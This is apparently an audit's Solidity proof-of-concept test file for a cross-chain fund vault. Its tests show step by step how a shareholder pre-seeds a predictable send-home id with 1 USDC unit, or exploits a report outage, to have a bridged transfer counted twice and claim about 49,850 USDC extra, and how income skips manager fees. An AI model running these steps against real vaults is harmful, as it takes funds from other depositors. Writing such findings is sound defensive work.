// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/console2.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {TransferKind, BridgeQuote} from "../../../src/interfaces/FundTypes.sol";
import {ReportCodec} from "../../../src/libraries/ReportCodec.sol";
import {TransitMessage} from "../../../src/libraries/TransitMessage.sol";
import {CoreBCrossChainFixture} from "./CoreBCrossChainFixture.sol";

/// @notice New defect found while porting core-b H02 (H-02) onto main, in the S-4 fix.
///         `CoreVaultLogic.receiveHubBound` (src/core/CoreVaultLogic.sol:579) starts the recovery clock of an unlisted
///         hub-bound id (`pendingSince`) at the FIRST arrival under that id, and `recoverUnlistedArrival` (:623, readyAt
///         at :633) opens at `pendingSince + 6 h + 3 days + 2 x maxReportAge`. Send-home ids are predictable
///         (`keccak256(fundId, spokeChainId, ++transitNonce)`, src/spoke/SpokeCrossChainLib.sol:64), the Core Vault's
///         Across handler accepts any amount above zero (src/core/CoreVaultTransit.sol:125-134), and the message is
///         unauthenticated, so anyone can pre-seed a future id with 1 base unit of USDC (a self-made `fillRelay` to the
///         Core Vault) and start its clock days before the manager sends home. When the real send home is then filled,
///         before the report that lists it reaches the hub (the normal order: a fill takes minutes, a finalized report
///         15 to 20 min), anyone can call `recoverUnlistedArrival` at once: the USDC is credited to Idle while the hub's
///         latest report still shows the same principal on the spoke, so Share Assets count the transfer twice until
///         the next report. A shareholder recovers and claims in one transaction at the inflated price.
contract New_PreSeededUnlistedArrivalRecovery is CoreBCrossChainFixture {
    uint256 internal constant SEND = 100_000e6;
    uint256 internal constant ARRIVES = 99_950e6;
    uint256 internal constant HOME_OUT = 99_900e6;

    function test_POC_NEW_S04_preSeededIdLetsAShareholderCreditASendHomeTwiceAndExitOnIt() public {
        _deposit(alice, 500_000e6);
        _deposit(bob, 500_000e6);
        _report(); // S-14
        bytes32 out = _sendToSpoke(SEND, ARRIVES);
        _fillOnSpoke(out, ARRIVES);
        _report(); // the spoke holds 99,950 USDG, confirmed
        uint256 fairAssets = vault.shareAssets();
        assertEq(fairAssets, 997_450e6);

        // Bob opens a Standard Payout for everything he owns (no Payout Fee on Standard).
        vm.prank(bob);
        vault.requestPayout(1_000_000e6, ICoreVault.PayoutMode.Standard);

        // Bob pre-seeds the spoke's next send-home id with 1 base unit (fillRelay to the Core Vault with that message).
        bytes32 predicted = keccak256(abi.encode(FUND_ID, SPOKE, uint256(1)));
        usdc.mint(address(hubAcross), 1);
        _fillOnHub(predicted, 1, TransferKind.Principal);
        uint256 seededAt = block.timestamp;

        // Days later the manager brings the principal home, as usual; the keeper keeps reporting meanwhile.
        vm.warp(seededAt + 6 hours + ReportCodec.HUB_BOUND_RETENTION + 2 * uint256(MAX_REPORT_AGE));
        _refreshPrices();
        _report();
        assertEq(vault.shareAssets(), fairAssets, "nothing changed yet");
        vm.prank(manager);
        bytes32 home = spoke.sendToHub(
            ARRIVES, TransferKind.Principal, 0, BridgeQuote(HOME_OUT, uint32(block.timestamp), 0, address(0))
        );
        assertEq(home, predicted, "the id Bob seeded");
        vm.warp(block.timestamp + 2 minutes);
        _fillOnHub(home, HOME_OUT, TransferKind.Principal); // held apart: no accepted report lists it yet
        assertEq(vault.shareAssets(), fairAssets, "the hold-apart keeps Share Assets right");

        uint256 snap = vm.snapshotState();
        // Honest order: the listing report arrives first, then Bob claims.
        _report();
        uint256 honestAssets = vault.shareAssets();
        vm.prank(bob);
        ICoreVault.PayoutReceipt memory honest = vault.claimPayout("");
        vm.revertToState(snap);

        // Bob's order, one transaction: recover the arrival early, then claim.
        vm.startPrank(bob);
        uint256 recovered = vault.recoverUnlistedArrival(0, home);
        uint256 inflatedAssets = vault.shareAssets();
        ICoreVault.PayoutReceipt memory attack = vault.claimPayout("");
        vm.stopPrank();

        // The next report lists the transfer (nothing left to credit) and shows the spoke without the principal.
        _report();
        uint256 aliceValue = shares.balanceOf(alice) * vault.sharePrice() / 1e36;

        console2.log("Share Assets fair / honest after report / inflated", fairAssets, honestAssets, inflatedAssets);
        console2.log("recovered", recovered);
        console2.log("Bob paid honest / with the early recovery", honest.usdcPaid, attack.usdcPaid);
        console2.log("Alice's value after", aliceValue);
        assertEq(recovered, HOME_OUT + 1);
        assertEq(inflatedAssets, fairAssets + HOME_OUT + 1, "the transfer is counted on the spoke and in Idle");
        assertEq(honestAssets, fairAssets - (ARRIVES - HOME_OUT), "honest: only the bridge fee is gone");
        assertEq(honest.usdcPaid, 497_453_250_000);
        assertEq(attack.usdcPaid, 547_303_312_500, "Bob is paid 49,850.06 USDC more");
        assertEq(aliceValue, 448_725_000_000, "Alice is left with 448,725 instead of about 498,700");
    }

    /// @dev Without pre-seeding, the same double count after a report outage longer than the recovery delay: the
    ///      delay proves no future report can list the id, not that the latest ACCEPTED report no longer shows the
    ///      principal on the spoke. Payouts never check report age (S-28), so a holder recovers and claims at once.
    function test_POC_NEW_S04_recoveryDuringALongOutageCountsTheTransferTwice() public {
        _deposit(alice, 500_000e6);
        _deposit(bob, 500_000e6);
        _report(); // S-14
        bytes32 out = _sendToSpoke(SEND, ARRIVES);
        _fillOnSpoke(out, ARRIVES);
        _report(); // the last report the hub will accept for days: the spoke holds 99,950 USDG
        uint256 fairAssets = vault.shareAssets();
        vm.prank(bob);
        vault.requestPayout(1_000_000e6, ICoreVault.PayoutMode.Standard);

        vm.prank(manager);
        bytes32 home = spoke.sendToHub(
            ARRIVES, TransferKind.Principal, 0, BridgeQuote(HOME_OUT, uint32(block.timestamp), 0, address(0))
        );
        vm.warp(block.timestamp + 2 minutes);
        _fillOnHub(home, HOME_OUT, TransferKind.Principal);

        // No report is delivered for 6 h + 3 days + 2 x maxReportAge (keeper or Wormhole outage).
        vm.warp(block.timestamp + 6 hours + ReportCodec.HUB_BOUND_RETENTION + 2 * uint256(MAX_REPORT_AGE));
        _refreshPrices();
        vm.startPrank(bob);
        vault.recoverUnlistedArrival(0, home);
        uint256 inflatedAssets = vault.shareAssets();
        ICoreVault.PayoutReceipt memory r = vault.claimPayout("");
        vm.stopPrank();
        console2.log("Share Assets fair / after the recovery", fairAssets, inflatedAssets);
        console2.log("Bob paid", r.usdcPaid);
        assertEq(inflatedAssets, fairAssets + HOME_OUT, "Idle and the stale report both count the transfer");
        assertEq(r.usdcPaid, 547_303_312_500, "the same 49,850 USDC overpayment as with pre-seeding");
    }

    /// @dev Same lever on an Income send home: the S-4 "kind" residual (recovered as Principal, no fee split, no
    ///      accumulator), which the register says needs a multi-day report outage, is reachable at once.
    function test_POC_NEW_S04_preSeededIncomeSendHomeIsCreditedAsPrincipalWithoutFees() public {
        _deposit(alice, 1_000_000e6);
        _report(); // S-14
        // 10,000 USDG of income in the spoke's collected bucket (an Income-kind arrival).
        usdg.mint(address(spokeAcross), 10_000e6);
        spokeAcross.fill(
            address(spoke),
            address(usdg),
            10_000e6,
            TransitMessage.encode(FUND_ID, HUB, keccak256("income"), TransferKind.Income)
        );
        bytes32 predicted = keccak256(abi.encode(FUND_ID, SPOKE, uint256(1)));
        usdc.mint(address(hubAcross), 1);
        _fillOnHub(predicted, 1, TransferKind.Principal);

        vm.warp(block.timestamp + 6 hours + ReportCodec.HUB_BOUND_RETENTION + 2 * uint256(MAX_REPORT_AGE));
        _refreshPrices();
        _report();
        vm.prank(manager);
        bytes32 home = spoke.sendToHub(
            10_000e6, TransferKind.Income, 0, BridgeQuote(9995e6, uint32(block.timestamp), 0, address(0))
        );
        assertEq(home, predicted);
        vm.warp(block.timestamp + 2 minutes);
        _fillOnHub(home, 9995e6, TransferKind.Income);
        address feeVault = vault.managerFeeVault();

        uint256 snap = vm.snapshotState();
        _report(); // honest: the listing report credits it as Income
        uint256 honestFee = usdc.balanceOf(feeVault);
        uint256 honestCollected = vault.collectedIncome(address(usdc));
        vm.revertToState(snap);

        vault.recoverUnlistedArrival(0, home); // anyone, at once
        _report();
        console2.log("manager fee honest / recovered", honestFee, usdc.balanceOf(feeVault));
        console2.log("collected income honest / recovered", honestCollected, vault.collectedIncome(address(usdc)));
        assertEq(honestFee, 999_500_000, "honest: 20% performance fee, half of it to the manager (default slice)");
        assertEq(honestCollected, 7_996_000_000, "honest: 7,996 attributed to holders as income");
        assertEq(usdc.balanceOf(feeVault), 0, "recovered: no manager fee");
        assertEq(vault.collectedIncome(address(usdc)), 0, "recovered: no income attributed, 9,995 went to Idle");
    }
}
